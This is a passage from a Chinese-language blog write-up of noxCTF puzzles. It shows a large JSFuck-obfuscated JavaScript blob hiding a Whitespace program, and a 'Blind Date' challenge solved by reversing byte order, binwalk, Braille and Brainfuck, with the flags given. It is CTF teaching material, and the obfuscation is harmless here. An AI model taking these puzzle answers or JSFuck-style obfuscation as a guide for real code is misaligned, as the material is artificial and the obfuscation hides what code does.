(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+(!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+([][[]]+[])[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+(!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</span><br></pre></td></tr></table></figure></p><p>这不就是jsfuck吗，放到<a href="http://codertab.com/JsUnFuck跑一下，结果输出`nope`,事情远远没有想象的那么简单。经过仔细查看这些“空白”，发现不仅仅是空白，有很多空格，制表符之类的，Google查下，叫做Whitespace程序，[Whitespace](https://zh.wikipedia.org/wiki/Whitespace)是种深奥的编程语言。" target="_blank" rel="noopener">http://codertab.com/JsUnFuck跑一下，结果输出`nope`,事情远远没有想象的那么简单。经过仔细查看这些“空白”，发现不仅仅是空白，有很多空格，制表符之类的，Google查下，叫做Whitespace程序，[Whitespace](https://zh.wikipedia.org/wiki/Whitespace)是种深奥的编程语言。</a></p><p>这个<a href="https://vii5ard.github.io/whitespace/" target="_blank" rel="noopener">网站</a>可以在线解密,</p><p>最后flag：<code>noxCTF{DaFuckIsWHITESPACE}</code></p><h2 id="Blind-Date"><a href="#Blind-Date" class="headerlink" title="Blind Date"></a>Blind Date</h2><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My mom got me a date with someone! she sent me an image but i cannot open it. I don&apos;t want it to be a blind date. Can you help me?</span><br></pre></td></tr></table></figure></p><p>这真的是个脑洞题！下载一个图片，又是打不开的文件，查看下格式</p><p><img src="https://i.loli.net/2018/09/09/5b951731eaa60.png" alt="打不开的图片.png"></p><p>跟正常文件比下</p><p><img src="https://i.loli.net/2018/09/09/5b9517a145efa.png" alt="正常.png"></p><p>确实不一样哦！写个脚本试试恢复看看<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">'BlindDate.jpeg'</span>, <span class="string">"rb"</span>)</span><br><span class="line">s = f.read()</span><br><span class="line">f.close()</span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">4</span>):</span><br><span class="line">    data += s[i:i+<span class="number">4</span>][::<span class="number">-1</span>]</span><br><span class="line">file = open(<span class="string">'blind.jpeg'</span>,<span class="string">'wb'</span>)</span><br><span class="line">file.write(data)</span><br></pre></td></tr></table></figure></p><p>得到这样一个沙雕图片</p><p><img src="https://i.loli.net/2018/09/09/5b951872316e5.jpeg" alt="blind.jpeg"></p><p>按照套路，binwalk跑一下</p><p><img src="https://i.loli.net/2018/09/09/5b9518fb774d1.png" alt="3.png"></p><p>有个zip文件，分离下，得到压缩文件，可是。。要密码，这要我去哪里找密码啊？</p><p><img src="https://i.loli.net/2018/09/09/5b9519aa309bb.jpeg" alt=""></p><p>再次看看那个盲人图片，strings分析之后得到一些奇怪的东西<code>Li4gICAuICAuLiAgLi4gICAuICAuLiAgLi4gICAuICAuLiAgLiAgLi4NCi4gICAgLiAgIC4gICAgICAgLiAgICAgIC4gICAgLiAgIC4gIC4gIA0KICAgIC4uICAgICAgICAgIC4uICAgICAgLiAgIC4uICAgICAgLiAgLgPK</code></p><p><img src="https://i.loli.net/2018/09/09/5b951a1cafa23.png" alt=""></p><p>尝试base64解密之后有得到这些奇怪的东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">..   .  ..  ..   .  ..  ..   .  ..  .  ..</span><br><span class="line">.    .   .       .      .    .   .  .  </span><br><span class="line">    ..          ..      .   ..      .  .</span><br></pre></td></tr></table></figure></p><p>摩尔斯？不像。那是啥？莫非是盲文！！<br>盲文解密之后为<code>F4C3P4LM</code>，试下解密zip，打开了！！高兴。又得到下面的东西。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++.+.+++++++++.&lt;---.+++++++++++++++++.--------------.&gt;+++.&lt;+++++++++++++++++.&lt;++++++++++++++++++.&gt;&gt;------.---------.--------.-----.++++++++++++++++++++++++++.&lt;&lt;.&gt;&gt;----.&lt;++++++++.+++.&gt;---------.&lt;&lt;+.&gt;&gt;++.&lt;++.-----.+++++.&lt;+++.&gt;&gt;++++++.&lt;&lt;-.&gt;-----.&lt;+.&gt;.+++.&gt;--------.&lt;&lt;---.&gt;&gt;++.&lt;++.-----.+++++.&lt;+++.&gt;&gt;++++++.&lt;&lt;-.++++++++++++.&gt;&gt;+++++++++.&lt;&lt;&lt;++++++++++++++++++++++.</span><br></pre></td></tr></table></figure><p>这个我知道是brainfuck，拿到<a href="https://sange.fi/esoteric/brainfuck/impl/interp/i.html" target="_blank" rel="noopener">网站</a>上面解密下.</p><p>flag:<code>noxCTF{W0uld_y0u_bl1nd_d4t3_4_bl1nd_d4t3?}</code></p><h2 id="Chop-Suey"><a href="#Chop-Suey" class="headerlink" title="Chop Suey"></a>Chop Suey</h2><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 